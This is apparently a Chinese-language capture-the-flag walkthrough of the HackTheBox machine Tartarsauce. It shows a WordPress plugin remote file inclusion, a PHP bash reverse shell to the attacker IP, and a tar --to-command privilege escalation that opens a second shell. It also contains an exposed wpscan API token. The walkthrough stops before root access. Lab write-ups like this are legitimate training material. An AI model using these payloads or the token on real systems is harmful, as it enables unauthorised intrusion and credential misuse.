# Tartarsauce

**tartarsauce是hackthebox上中等难度的靶机**



- 首先nmap扫描端口

![image-20211106235047726](http://cdn.mxrblog.cn/image-20211106235047726.png)

- 只开启了80端口

- 打开web浏览器查看web端口，发现只显示一饮料瓶

![image-20211107013804346](http://cdn.mxrblog.cn/image-20211107013804346.png)

- 进行目录扫描

![image-20211107021610267](http://cdn.mxrblog.cn/image-20211107021610267.png)

- 查看wp插件漏洞

`sudo wpscan --url http://10.10.10.88/webservices/wp -e vp --plugins-detection aggressive --api-token 64wEY6smCuQulgcBgg0cgstQ8urNAueZHIXAizHlNqM --max-threads 20`

![image-20211107124548765](http://cdn.mxrblog.cn/image-20211107124548765.png)

- 查看漏洞详细情况

![image-20211107140655291](http://cdn.mxrblog.cn/image-20211107140655291.png)



![image-20211107141213842](http://cdn.mxrblog.cn/image-20211107141213842.png)

- 将链接修改后使用wget或者curl拉取，并且使用nc查看响应

`http://10.10.10.88/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.2:4444`

![image-20211107143841003](http://cdn.mxrblog.cn/image-20211107143841003.png)

![image-20211107143851287](http://cdn.mxrblog.cn/image-20211107143851287.png)

- 文件包含漏洞测试成功，可以发现包含漏洞的文件是/wp-load.php
- 在攻击机器上创建一个名为wp-load.php的文件，并在文件中写入反弹shell代码

```
反弹shell
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'");?>
```

- 本地开启http服务

![image-20211107145202378](http://cdn.mxrblog.cn/image-20211107145202378.png)

- 再次测试并链接

![image-20211107145329575](http://cdn.mxrblog.cn/image-20211107145329575.png)

![image-20211107145348304](http://cdn.mxrblog.cn/image-20211107145348304.png)

- sudo -l 查看当前用户可执行的root命令
- 发现当前用户可以以onuma的身份执行tar命令

![image-20211107145629283](http://cdn.mxrblog.cn/image-20211107145629283.png)

- 使用tar命令进行反弹shell

`echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.2/4445 0>&1' > xxx.sh`

`tar -cvf xxx.tar xxx.sh`

`sudo  -u onuma tar -xvf xxx.tar --to-command /bin/bash`

- 获得onuma用户的shell

![image-20211107154312839](http://cdn.mxrblog.cn/image-20211107154312839.png)

- 使用pspy32脚本监控进程，发现有备份文件在定时以root身份运行，

![image-20211107161847218](http://cdn.mxrblog.cn/image-20211107161847218.png)

- 后面的太麻烦，不多做叙述。。。

